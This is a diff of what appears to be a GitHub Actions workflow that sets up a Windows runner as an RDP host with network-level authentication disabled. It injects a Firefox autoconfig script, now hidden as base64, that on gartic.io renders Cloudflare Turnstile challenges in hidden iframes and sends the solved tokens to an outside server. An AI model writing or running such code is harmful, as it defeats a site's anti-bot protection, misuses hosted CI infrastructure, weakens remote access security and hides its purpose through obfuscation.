@@ -24,48 +24,20 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Inject Gartic Script (Fixed Quotes)
+      - name: 2. Inject Gartic Script (Base64 Protection)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
           
-          # إعدادات ملف التعريف
+          # إعدادات التفعيل
           $pref = 'pref("general.config.filename", "mozilla.cfg");' + [char:10] + 'pref("general.config.obscure_value", 0);'
           $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
 
-          # كود الـ HTML الخاص بالـ Turnstile (مفصول لضمان عدم حدوث خطأ)
-          $htmlContent = '<!DOCTYPE html><html><head><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script></head><body><div id="cf-turnstile"></div><script>function r(){try{window.turnstile.render("#cf-turnstile",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>'
-
-          # كود السكربت كاملاً
-          $script = @"
-          try {
-              window.addEventListener('load', function() {
-                  if (location.href.includes('gartic.io')) {
-                      setInterval(function() { location.reload(); }, 50000);
-                      function sendToken(t) {
-                          if (typeof t !== 'string' || t.length <= 20) return;
-                          fetch('https://www.xsw.work.gd/add-token', {
-                              method: 'POST',
-                              headers: { 'Content-Type': 'application/json' },
-                              body: JSON.stringify({ token: t })
-                          }).catch(function() {});
-                      }
-                      window.addEventListener('message', function(e) {
-                          if (e.data && typeof e.data === 'string') { sendToken(e.data); }
-                      });
-                      for (var i = 0; i < 6; i++) {
-                          var f = document.createElement('iframe');
-                          f.style.display = 'none';
-                          f.sandbox = 'allow-scripts allow-same-origin';
-                          document.body.appendChild(f);
-                          f.srcdoc = '$htmlContent';
-                      }
-                  }
-              });
-          } catch (e) {}
-"@
-          $cfgContent = "//" + [char:10] + $script
-          $cfgContent | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
+          # السكربت الخاص بك مشفر بالكامل لمنع أخطاء YAML
+          $b64 = "dHJ5IHsgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCBmdW5jdGlvbigpIHsgaWYgKGxvY2F0aW9uLmhyZWYuaW5jbHVkZXMoJ2dhcnRpYy5pbycpKSB7IHNldEludGVydmFsKGZ1bmN0aW9uKCkgeyBsb2NhdGlvbi5yZWxvYWQoKTsgfSwgNTAwMDApOyBmdW5jdGlvbiBzZW5kVG9rZW4odCkgeyBpZiAodHlwZW9mIHQgIT09ICdzdHJpbmcnIHx8IHQubGVuZ3RoIDw9IDIwKSByZXR1cm47IGZldGNoKCdodHRwczovL3d3dy54c3cud29yay5nZC9hZGQtdG9rZW4nLCB7IG1ldGhvZDogJ1BPU1QnLCBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwgYm9keTogSlNPTi5zdHJpbmdpZnkoeyB0b2tlbjogdCB9KSB9KS5jYXRjaChmdW5jdGlvbigpIHt9KTsgfSB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIGZ1bmN0aW9uKGUpIHsgaWYgKGUuZGF0YSAmJiB0eXBlb2YgZS5kYXRhID09PSAnc3RyaW5nJykgeyBzZW5kVG9rZW4oZS5kYXRhKTsgfSB9KTsgZm9yICh2YXIgaSA9IDA7IGkgPCA2OyBpKyspIHsgdmFyIGYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsgZi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBmLnNhbmRib3ggPSAnYWxsb3ctc2NyaXB0cyBhbGxvdy1zYW1lLW9yaWdpbic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik7IGYuc3JjZG9jID0gJzwhRE9DVFlQRSBodG1sPmh0bWw+aGVhZD48c2NyaXB0IHNyYz0iaHR0cHM6Ly9jaGFsbGVuZ2VzLmNsb3VkZmxhcmUuY29tL3R1cm5zdGlsZS92MC9hcGkuanMiIGFzeW5jIGRlZmVyPjwvc2NyaXB0PjwvaGVhZD48Ym9keT48ZGl2IGlkPSJjZi10dXJud3N0aWxlIj48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIHIoKXt0cnl7d2luZG93LnR1cm5zdGlsZS5yZW5kZXIoIiNjZi10dXJud3N0aWxlIix7c2l0ZWtleToiMHg0QUFBQUFBQkJQS2FJYk53blBFZlNvIixjYWxsYmFjazpmdW5jdGlvbih0KXtwYXJlbnQucG9zdE1lc3NhZ2UodCwiKiIpO319KTt9Y2F0Y2goZSl7fX1zZXRJbnRlcnZhbChyLDM1MDApO3NldFRpbWVvdXQociwyMDApOzwvc2NyaXB0PjwvYm9keT48L2h0bWw+JzsgfSB9IH0pOyB9IGNhdGNoIChlKSB7fQ=="
+          $js = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+          $cfg = "//" + [char:10] + $js
+          $cfg | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
 
       - name: 3. Create RDP User
         run: |
